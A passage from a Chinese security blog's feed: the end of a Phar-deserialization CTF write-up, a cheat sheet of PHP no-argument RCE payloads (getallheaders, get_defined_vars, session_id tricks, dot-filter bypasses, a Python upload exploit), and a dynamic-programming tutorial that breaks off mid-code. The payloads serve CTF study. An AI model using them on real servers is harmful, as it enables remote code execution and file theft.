$file-&gt;$func();    &#125;&#125;</code></pre><p><strong>array_push</strong>：将一个或多个单元压入数组的末尾（入栈）</p><p><strong>foreach</strong>：遍历数组</p><p>看到其中的<code>$file-&gt;$func();</code>，如果<code>$func</code>为<code>close</code>，就可以成功调用<code>File</code>类中的<code>close</code>方法，于是构造完整payload：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass User &#123;    public $db;&#125;class FileList &#123;    private $files;    private $results;    private $funcs;    public function __construct() &#123;        $this-&gt;files &#x3D; array(new File());        $this-&gt;results &#x3D; array();        $this-&gt;funcs &#x3D; array();    &#125;&#125;class File &#123;    public $filename;    public function __construct()    &#123;        $this-&gt;filename&#x3D;&#39;&#x2F;flag.txt&#39;;    &#125;&#125;$o &#x3D; new User();$o -&gt; db &#x3D; new FileList();$phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为 phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置 stub$phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的 meta-data 存入 manifest$phar-&gt;addFromString(&quot;poc.php&quot;, &quot;poc&quot;); &#x2F;&#x2F;添加要压缩的文件&#x2F;&#x2F;签名自动计算$phar-&gt;stopBuffering();rename(&#39;phar.phar&#39;,&#39;phar.jpg&#39;);?&gt;</code></pre><p>将生成的<code>phar.jpg</code>上传，再在<code>delete</code>操作时抓包改包，如下，即可成功得到<code>flag</code>，话说为什么是<code>flag.txt</code>我也不知道，一般不是直接<code>flag</code>吗？-.-</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504221851430.png" alt loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP无参数RCE</title>
      <link href="/posts/4f9c9406/"/>
      <url>/posts/4f9c9406/</url>
      
        <content type="html"><![CDATA[<p>膜膜膜膜膜膜（这东西真的是奇淫技巧）</p><p><strong>利用条件</strong>：<code>eval($_GET[&#39;exp&#39;]);</code></p><p><strong>限制条件</strong>：<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $exp)</code></p><a id="more"></a><p><strong>目录下文件</strong>：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429110200063.png" alt loading="lazy"></p><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a><strong>测试代码</strong></h4><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F;index.php&lt;?phpif(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;        eval($_GET[&#39;code&#39;]);&#125;?&gt;</code></pre><p><code>(?R)</code>引用当前表达式，后面加了<code>?</code>递归调用</p><p>以上正则表达式只匹配<code>a(b(c()))</code>或<code>a()</code>这种格式，不匹配<code>a(&quot;123&quot;)</code>，也就是说我们传入的值函数不能带有参数</p><h4 id="Payload1-getenv"><a href="#Payload1-getenv" class="headerlink" title="Payload1-getenv()"></a>Payload1-getenv()</h4><pre class="language-php" data-language="php"><code class="language-php">var_dump(getenv(phpinfo()));</code></pre><p>可以获取敏感信息</p><ul><li><strong>getenv()</strong>：获取一个环境变量的值，<code>phpinfo()</code>可以获取所有环境变量</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429113257924.png" alt loading="lazy"></p><h4 id="Payload2-getallheaders"><a href="#Payload2-getallheaders" class="headerlink" title="Payload2-getallheaders()"></a><strong>Payload2</strong>-getallheaders()</h4><pre class="language-php" data-language="php"><code class="language-php">eval(end(getallheaders()));</code></pre><p>RCE</p><ul><li><strong>end()</strong>：将数组的内部指针指向最后一个单元</li><li><strong>getallheaders()</strong>：获取全部 HTTP 请求头信息</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429114144142.png" alt loading="lazy"></p><h4 id="Payload3-get-defined-vars"><a href="#Payload3-get-defined-vars" class="headerlink" title="Payload3-get_defined_vars()"></a>Payload3-get_defined_vars()</h4><pre class="language-php" data-language="php"><code class="language-php">eval(end(current(get_defined_vars())));&amp;flag&#x3D;system(&#39;ls&#39;);</code></pre><p>利用全局变量进RCE</p><ul><li><strong>get_defined_vars()</strong>：返回由所有已定义变量所组成的数组，会返回<code>$_GET,$_POST,$_COOKIE,$_FILES</code>全局变量的值</li><li><strong>current()</strong>：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回<code>$_GET</code>变量的数组值</li><li><strong>get_defined_vars()</strong>：返回由所有已定义变量所组成的数组，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。返回数组顺序为<code>get-&gt;post-&gt;cookie-&gt;files</code></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429115651090.png" alt loading="lazy"></p><p>而如果网站对<code>$_GET,$_POST,$_COOKIE</code>都做的过滤， 那我们只能从<code>$_FILES</code>入手了，exp如下：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsdef str2hex(payload):  txt &#x3D; &#39;&#39;  for i in payload:      txt +&#x3D; hex(ord(i))[-2:]  return txtpayload &#x3D; str2hex(&quot;system(&#39;cat flag.php&#39;);&quot;)files &#x3D; &#123;    payload: b&#39;extrader&#39;&#125;r &#x3D; requests.post(&quot;http:&#x2F;&#x2F;192.168.0.107&#x2F;index.php?exp&#x3D;eval(hex2bin(array_rand(end(get_defined_vars()))));&quot;, files&#x3D;files, allow_redirects&#x3D;False)  # allow_redirects&#x3D;False 禁用重定向处理print(r.content.decode())</code></pre><ul><li><strong>array_rand()</strong>：从数组中随机取出一个或多个单元，如果只取出一个，<code>array_rand()</code>返回随机单元的键名。 否则就返回包含随机键名的数组。</li><li><strong>end()</strong>：将数组的内部指针指向最后一个单元</li><li><strong>hex2bin()</strong>：转换十六进制字符串为二进制字符串</li></ul><p>结果将输出<code>flag.php</code>文件的全部内容，由于空格和点都会被替换成下换线，所以需要用十六进制进行绕过</p><h4 id="Payload4-session-start"><a href="#Payload4-session-start" class="headerlink" title="Payload4-session_start()"></a>Payload4-session_start()</h4><p>文件读取：</p><pre class="language-php" data-language="php"><code class="language-php">show_source(session_id(session_start()));var_dump(file_get_contents(session_id(session_start())))highlight_file(session_id(session_start()));readfile(session_id(session_start()));抓包传入Cookie: PHPSESSID&#x3D;(想读的文件)即可</code></pre><p>RCE：</p><pre class="language-php" data-language="php"><code class="language-php">eval(hex2bin(session_id(session_start())));抓包传入Cookie: PHPSESSID&#x3D;(&quot;system(&#39;命令&#39;)&quot;的十六进制)</code></pre><p>以上的payload好像只适用于<code>php7</code>以下的版本，php7以上的不会显示</p><ul><li><strong>session_start()</strong>：启动新会话或者重用现有会话，成功开始会话返回 <strong><code>TRUE</code></strong> ，反之返回 <strong><code>FALSE</code></strong></li><li><strong>session_id()</strong>：获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）。</li></ul><h4 id="Payload5-scandir"><a href="#Payload5-scandir" class="headerlink" title="Payload5-scandir()"></a>Payload5-scandir()</h4><p>文件读取：</p><pre class="language-php" data-language="php"><code class="language-php">当前目录：highlight_file(array_rand(array_flip(scandir(getcwd()))));上级目录文件：highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</code></pre><ul><li><strong>getcwd()</strong>：取得当前工作目录，成功则返回当前工作目录，失败返回 <strong><code>FALSE</code></strong>。</li><li><strong>dirname()</strong>：返回路径中的目录部分，返回 path 的父目录。 如果在 <code>path</code> 中没有斜线，则返回一个点（’<em>.</em>‘），表示当前目录。否则返回的是把 <code>path</code> 中结尾的 <code>/component</code>（最后一个斜线以及后面部分）去掉之后的字符串(也就是上级目录的文件路径)。</li><li><strong>chdir()</strong>：改变目录，成功时返回 <strong><code>TRUE</code></strong>， 或者在失败时返回 <strong><code>FALSE</code></strong>。</li><li><strong>scandir()</strong>：列出指定路径中的文件和目录。成功则返回包含有文件名的数组，如果失败则返回 <strong><code>FALSE</code></strong>。如果 <code>directory</code> 不是个目录，则返回布尔值 <strong><code>FALSE</code></strong> 并生成一条 <strong><code>E_WARNING</code></strong> 级的错误。</li><li><strong>array_flip()</strong>：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 <strong><code>NULL</code></strong>。</li><li><strong>array_rand()</strong>：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，<strong>array_rand()</strong> 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。</li></ul><p><strong>array_flip()</strong>和<strong>array_rand()</strong>配合使用可随机返回当前目录下的文件名</p><p><strong>dirname(chdir(dirname()))</strong>配合切换文件路径</p><h4 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a><code>.</code>绕过</h4><h5 id="current-localeconv"><a href="#current-localeconv" class="headerlink" title="current(localeconv())"></a><strong>current(localeconv())</strong></h5><ul><li><strong>localeconv()</strong>：返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>.</code></li></ul><h5 id="phpversion"><a href="#phpversion" class="headerlink" title="phpversion()"></a><strong>phpversion()</strong></h5><ul><li><code>phpversion()</code>返回php版本，如<code>7.3.5</code></li><li><code>floor(phpversion())</code>返回<code>7</code></li><li><code>sqrt(floor(phpversion()))</code>返回<code>2.6457513110646</code></li><li><code>tan(floor(sqrt(floor(phpversion()))))</code>返回<code>-2.1850398632615</code></li><li><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>返回<code>4.5017381103491</code></li><li><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>返回<code>45.081318677156</code></li><li><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回<code>46</code></li><li><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>返回<code>.</code></li><li><code>var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>扫描当前目录</li><li><code>next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>返回<code>..</code></li></ul><p><strong>floor()</strong>：舍去法取整，<strong>sqrt()</strong>：平方根，<strong>tan()</strong>：正切值，<strong>cosh()</strong>：双曲余弦，<strong>sinh()</strong>：双曲正弦，<strong>ceil()</strong>：进一法取整</p><h5 id="crypt"><a href="#crypt" class="headerlink" title="crypt()"></a><strong>crypt()</strong></h5><p><code>chr(ord(hebrevc(crypt(phpversion()))))</code>返回<code>.</code></p><ul><li><code>hebrevc(crypt(arg))</code>可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符</li></ul><p><strong>crypt()</strong>：单向字符串散列，返回散列后的字符串或一个少于 13 字符的字符串，从而保证在失败时与盐值区分开来。</p><p><strong>hebrevc()</strong>：将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符，返回视觉顺序字符串。</p><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p><strong>current()</strong>的别名<strong>pos()</strong></p><p><strong>readgzfile</strong>可以代替<strong>readfile</strong></p><p>目录操作：</p><ul><li><strong>getchwd()</strong> ：函数返回当前工作目录。</li><li><strong>scandir()</strong> ：函数返回指定目录中的文件和目录的数组。</li><li><strong>dirname()</strong> ：函数返回路径中的目录部分。</li><li><strong>chdir()</strong> ：函数改变当前的目录。</li></ul><p>数组相关的操作：</p><ul><li><a href="https://www.w3school.com.cn/php/func_array_end.asp">end()</a> ： 将内部指针指向数组中的最后一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_next.asp">next()</a> ：将内部指针指向数组中的下一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_prev.asp">prev()</a> ：将内部指针指向数组中的上一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_reset.asp">reset()</a> ： 将内部指针指向数组中的第一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_each.asp">each()</a> ： 返回当前元素的键名和键值，并将内部指针向前移动</li></ul><h4 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h4><h5 id="GXYCTF2019—禁止套娃"><a href="#GXYCTF2019—禁止套娃" class="headerlink" title="GXYCTF2019—禁止套娃"></a>GXYCTF2019—禁止套娃</h5><p>扫描目录<code>.git</code>源码泄露，<code>Githack</code>得到<code>index</code>源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#39;exp&#39;]))&#123;    if (!preg_match(&#39;&#x2F;data:\&#x2F;\&#x2F;|filter:\&#x2F;\&#x2F;|php:\&#x2F;\&#x2F;|phar:\&#x2F;\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;        if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;            if (!preg_match(&#39;&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;                &#x2F;&#x2F; echo $_GET[&#39;exp&#39;];                @eval($_GET[&#39;exp&#39;]);            &#125;            else&#123;                die(&quot;还差一点哦！&quot;);            &#125;        &#125;        else&#123;            die(&quot;再好好想想！&quot;);        &#125;    &#125;    else&#123;        die(&quot;还想读flag，臭弟弟！&quot;);    &#125;&#125;&#x2F;&#x2F; highlight_file(__FILE__);?&gt;</code></pre><p>payload1：</p><pre class="language-php" data-language="php"><code class="language-php">highlight_file(next(array_reverse(scandir(current(localeconv())))));</code></pre><p>payload2：</p><pre class="language-php" data-language="php"><code class="language-php">show_source(session_id(session_start()));Cookie: PHPSESSID&#x3D;flag.php</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></li><li><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">https://www.cnblogs.com/wangtanzhi/p/12260986.html</a></li><li><a href="http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html">http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html</a></li><li><a href="https://www.gem-love.com/ctf/530.html?replytocom=5">https://www.gem-love.com/ctf/530.html?replytocom=5</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    
    
    <entry>
      <title>算法-动态规划</title>
      <link href="/posts/e57c001c/"/>
      <url>/posts/e57c001c/</url>
      
        <content type="html"><![CDATA[<h3 id="斐波拉契数列"><a href="#斐波拉契数列" class="headerlink" title="斐波拉契数列"></a>斐波拉契数列</h3><p><code>1,1,2,3,5,8,13...</code>，状态转移方程：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190059738.png" alt loading="lazy"></p><a id="more"></a><h4 id="暴力递归"><a href="#暴力递归" class="headerlink" title="暴力递归"></a><strong>暴力递归</strong></h4><pre class="language-python" data-language="python"><code class="language-python">def main(a):    if a &#x3D;&#x3D; 1 or a &#x3D;&#x3D; 2:        return 1    return main(a-1) + main(a-2)</code></pre><p>时间复杂度为<code>O(2^n)</code>，有如下递归树：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190828749.png" alt loading="lazy"></p><p>我们可以看到许多的计算都重复了，例如下面的<code>f(18)</code>等，那么如何避免这个问题呢？有效的方法就是将第一次计算出的<code>f(18)</code>的结果保留下来，如果下次再计算到这个<code>f(18)</code>的时候直接将结果取出来即可，简称备忘录方法，如下：</p><h4 id="带备忘录的递归解法"><a href="#带备忘录的递归解法" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><pre class="language-python" data-language="python"><code class="language-python">memo &#x3D; dict()def main(a):    if a &#x3D;&#x3D; 1 or a &#x3D;&#x3D; 2:        return 1    if a in memo:        return memo[a]    memo[a] &#x3D; main(a-1) + main(a-2)    return main(a-1) + main(a-2)</code></pre><h4 id="DP-table解法"><a href="#DP-table解法" class="headerlink" title="DP table解法"></a><strong>DP table解法</strong></h4><p>自底向上优化</p><pre class="language-python" data-language="python"><code class="language-python">dp &#x3D; []def main(a):    if a &#x3D;&#x3D; 1 or a &#x3D;&#x3D; 2:        return 1    dp.append(1)    dp.append(1)    for i in range(2, a):        dp.append(dp[i - 1] + dp[i - 2])    return dp[a-1]</code></pre><p>原理图如下(emmmmm，图是搬运过来的，所以前面的第0位还是用到了的，往前移一位就行了)</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190143099.png" alt loading="lazy"></p><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>再进行空间复杂度的优化</p><pre class="language-python" data-language="python"><code class="language-python">def main(a):    if a &#x3D;&#x3D; 1 or a &#x3D;&#x3D; 2:        return 1    prev &#x3D; 1    curr &#x3D; 1    for i in range(3, a + 1):        num &#x3D; prev + curr        prev &#x3D; curr        curr &#x3D; num    return curr</code></pre><p>由原来的时间复杂度<code>O(2^n)</code>变为了<code>O(n)</code>，空间复杂度降为<code>O(1)</code></p><h3 id="凑零钱问题"><a href="#凑零钱问题" class="headerlink" title="凑零钱问题"></a>凑零钱问题</h3><p>假设给你<code>k</code>中面值的硬币，面值分别为<code>c1，c2，c3 ... ck</code>，每种硬币的数量无限，再给一个总金额<code>amount</code>，问<strong>最少</strong>需要几枚硬币凑出这个金额，如果不可能凑出，则返回-1</p><p>状态转移方程：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421185311310.png" alt loading="lazy"></p><h4 id="暴力递归-1"><a href="#暴力递归-1" class="headerlink" title="暴力递归"></a><strong>暴力递归</strong></h4><pre class="language-python" data-language="python"><code class="language-python">def coinChange(coins, amount):    def main(n):        if n &#x3D;&#x3D; 0:  # 当n - coin &#x3D; 0 的时候说明这条路走的通            return 0        if n &lt; 0:  # 当n - coin &lt; 0 的时候则说明这条路走不通            return -1        res &#x3D; float(&quot;INF&quot;)  # float(&quot;INF&quot;)为正无穷大，负无穷大则为float(&quot;-INF&quot;)        for coin in coins:  # 递归列表            sub &#x3D; main(n - coin)  # 取出一个值n就要减去那个值            if sub &#x3D;&#x3D; -1:                continue  # 当main函数的返回值为-1的时候，这条路走不通，则挑出循环            res &#x3D; min(res, 1 + sub)  # 当到了树的最低下，上面的if语句没有执行跳出去，则使res&#x3D;sub+1        return res if res !&#x3D; float(&quot;INF&quot;) else -1  # 这条路走的通，则返回res的值给sub，结合上面的一条语句进行计数    return main(amount)# 最后取出第一个选择的那个数字的时候计算出的res最小值，然后再把每个数字的最小值拿出来比较得出最终的最小值if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(coinChange([1, 2, 5], 11))</code></pre><p>以上的路走的通的意思是能够凑出这些硬币，递归图如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421185848166.png" alt loading="lazy"></p><h4 id="带备忘录的递归解法-1"><a href="#带备忘录的递归解法-1" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><pre class="language-python" data-language="python"><code class="language-python">def coinChange(coins, amount):    memo &#x3D; dict()    def main(n):        if n in memo:  # 查找备忘录，避免重复计算，就是计算以上颜色相同的部分            return memo[n]        if n &#x3D;&#x3D; 0:            return 0        if n &lt; 0:            return -1        res &#x3D; float(&quot;INF&quot;)        for coin in coins:            sub &#x3D; main(n - coin)            if sub &#x3D;&#x3D; -1:                continue            res &#x3D; min(res, 1 + sub)        memo[n] &#x3D; (res if res !&#x3D; float(&quot;INF&quot;) else -1)        return memo[n]    return main(amount)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(coinChange([1, 2, 5], 11))</code></pre><h4 id="DP-table解法-1"><a href="#DP-table解法-1" class="headerlink" title="DP table解法"></a><strong>DP table解法</strong></h4><pre class="language-python" data-language="python"><code class="language-python">def main(coins, a):    for i in range(a + 1):        dp.append(i)    for i in range(a + 1):        for coin in coins:            if i - coin &lt; 0:                continue            dp[i] &#x3D; min(dp[i], 1 + dp[i - coin])    return -1 if dp[a] &#x3D;&#x3D; (a + 1) else dp[a]if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    dp &#x3D; []    print(main([1, 2, 5], 11))</code></pre><p>演示图如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421220220973.png" alt loading="lazy"></p><p>借用大佬的一句话：</p><p>计算机解决问题其实没有任何奇技淫巧，他唯一的解决方法就是穷举，穷举所有的可能性。算法设计无非就是先思考“如何穷举”，然后再追求“如何聪明的穷举”</p><h3 id="最长递增子序列"><a href="#最长递增子序列" class="headerlink" title="最长递增子序列"></a>最长递增子序列</h3><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422111536792.png" alt loading="lazy"></p><h4 id="动态规划解法"><a href="#动态规划解法" class="headerlink" title="动态规划解法"></a>动态规划解法</h4><p>动态规划的核⼼设计思想是数学归纳法。</p><p>假设当结论在<code>k&lt;n</code>的时候成立，然后想办法证明<code>k=n</code>的时候结论也成立，如果能够证明的出来，那么就说明这个结论对于任何数都成立，再看到这个题目，假如我们能够证明，最后一个<code>nums[i]</code>的值大于前一个<code>nums[j]</code>的值，那么就能够证明出他和<code>nums[j]</code>所构成的最长递增子序列能够结合，随后再将长度加一，且将<code>nums[i]</code>加入到这个最长递增子序列中，即：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/gif2.gif" alt loading="lazy"></p><p>代码实现</p><pre class="language-python" data-language="python"><code class="language-python">def main(nums):    res &#x3D; 0    dp &#x3D; []  # 定义每一位数的最长递增子序列    for i in range(len(nums)):        dp.append(1)  # 令每一位的初始值为1    for i in range(len(nums)):        for j in range(i):            if nums[i] &gt; nums[j]:                dp[i] &#x3D; max(dp[i], dp[j] + 1)  # dp[i]表示nums[i]这个数结尾的最长递增子序列的长度    for i in range(len(dp)):        res &#x3D; max(res, dp[i])    return resif __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(main([8, 7, 10]))</code></pre><p>可见时间复杂度为O(n^2)</p><h4 id="二分查找解法"><a href="#二分查找解法" class="headerlink" title="二分查找解法"></a>二分查找解法</h4><p>将输入的序列分成若干堆，需要遵循以下规则：</p><p>只能把小的数字压到比它大的数字上，也就是用小的数字覆盖掉原来大的，那么如何去压呢？那么就看该数字该如何选择了，如果当前数字较大没有可以放置的堆，那么就在边上新建一个堆，再把数字放进去，如果有多个堆可以选择，则选择这多个堆中考最左边的位置，保证堆顶的数字是有序的了，就像这样（A是最大的）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422120140509.png" alt loading="lazy"></p><p>这样堆顶的数字就可以形成一个最长递增子序列，当然序列肯定不止一个，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422120330841.png" alt loading="lazy"></p><p>能够保证得出最长递增子序列，随后在查找该放在哪个堆的时候使用二分法查找就可以提高效率，代码如下：</p><pre class="language-python" data-language="python"><code class="language-python">def main(nums):    piles &#x3D; 0  #定义最长递增子序列的长度    top &#x3D; []  # 定义每一位数的最长递增子序列    for i in range(len(nums)):        top.append(0)  # 令每一位的初始值为1    for i in range(len(nums)):        poker &#x3D; nums[i]        left &#x3D; 0        right &#x3D; piles        while left &lt; right:            mid &#x3D; int((left + right) &#x2F; 2)            if top[mid] &gt; poker:                right &#x3D; mid            elif top[mid] &lt; poker:                left &#x3D; mid + 1            else:                right &#x3D; mid        if left &#x3D;&#x3D; piles:            piles +&#x3D; 1  # 最长递增子序列的长度加一        top[left] &#x3D; poker    return pilesif __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(main([8, 7, 6, 1, 4, 10]))</code></pre><h3 id="编辑距离"><a href="#编辑距离" class="headerlink" title="编辑距离"></a>编辑距离</h3><p>先来看一下题目描述</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422161419634.png" alt loading="lazy"></p><h4 id="递归解法"><a href="#递归解法" class="headerlink" title="递归解法"></a>递归解法</h4><pre class="language-python" data-language="python"><code class="language-python">def minDistance(s1, s2):    def dp(i, j):        if i &#x3D;&#x3D; -1:            return j + 1  # 假如当s1字符串循环i次循环完了，j还有剩下的部分就直接全部进行一个操作j+1次即可，因为还剩下j+1个字符        if j &#x3D;&#x3D; -1:            return i + 1  # 同上        if s1[i] &#x3D;&#x3D; s2[j]:            return dp(i - 1, j - 1)  # 若相等直接跳过进行下一个字符的判断        else:            return min(dp(i, j - 1) + 1,  # 插入                       dp(i - 1, j - 1) + 1,  # 替换                       dp(i - 1, j) + 1)  # 删除    return dp(len(s1) - 1, len(s2) - 1)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(minDistance(&quot;apple&quot;, &quot;add&quot;))</code></pre><p>以上是将<code>apple</code>和<code>add</code>两个字符串进行转换，得出的结果为4，即所需操作的最小值</p><h4 id="带备忘录的递归解法-2"><a href="#带备忘录的递归解法-2" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><pre class="language-python" data-language="python"><code class="language-python">def minDistance(s1, s2):    memo &#x3D; dict()  # 备忘录    def dp(i, j):        if (i, j) in memo:            return memo[(i, j)]        if i &#x3D;&#x3D; -1:            return j + 1  # 假如当s1字符串循环i次循环完了，j还有剩下的部分就直接全部进行一个操作j+1次即可，因为还剩下j+1个字符        if j &#x3D;&#x3D; -1:            return i + 1  # 同上        if s1[i] &#x3D;&#x3D; s2[j]:            memo[(i, j)] &#x3D; dp(i - 1, j - 1)  # 若相等直接跳过进行下一个字符的判断        else:            memo[(i, j)] &#x3D; min(dp(i, j - 1) + 1,  # 插入                               dp(i - 1, j - 1) + 1,  # 替换                               dp(i - 1, j) + 1)  # 删除        return memo[(i, j)]    return dp(len(s1) - 1, len(s2) - 1)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(minDistance(&quot;apple&quot;, &quot;add&quot;))</code></pre><h4 id="DP-table解法-2"><a href="#DP-table解法-2" class="headerlink" title="DP table解法"></a>DP table解法</h4><p>自底向上</p><p>首先确定<code>dp</code>数组的含义，<code>dp</code>数组是一个二维数组，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422170423923.png" alt loading="lazy"></p><p><code>dp[i][j]</code>存储着<code>s1[i]</code>和<code>s2[j]</code>的最小编辑距离，各相邻的数据之间有如下关系：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422170651675.png" alt loading="lazy"></p><p>于是就可以写出以下代码：</p><pre class="language-python" data-language="python"><code class="language-python">def minDistance(s1, s2):    m &#x3D; len(s1)    n &#x3D; len(s2)    dp &#x3D; dict()    dp[(0, 0)] &#x3D; 0    for i in range(1, m + 1):        dp[(i, 0)] &#x3D; i    for i in range(1, n + 1):        dp[(0, i)] &#x3D; i    for i in range(1, m + 1):        for j in range(1, n + 1):            if s1[i - 1] &#x3D;&#x3D; s2[j - 1]:                dp[(i, j)] &#x3D; dp[(i - 1, j - 1)]            else:                dp[(i, j)] &#x3D; min(dp[(i, j - 1)] + 1,                                 dp[(i - 1, j - 1)] + 1,                                 dp[(i - 1, j)] + 1)    return dp[(m, n)]if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(minDistance(&quot;apple&quot;, &quot;add&quot;))</code></pre><p>随后还可以将步骤推出来：</p><pre class="language-python" data-language="python"><code class="language-python">def minDistance(s1, s2):    m &#x3D; len(s1)    n &#x3D; len(s2)    dp &#x3D; dict()    a &#x3D; dict()  # 记录每一步的操作 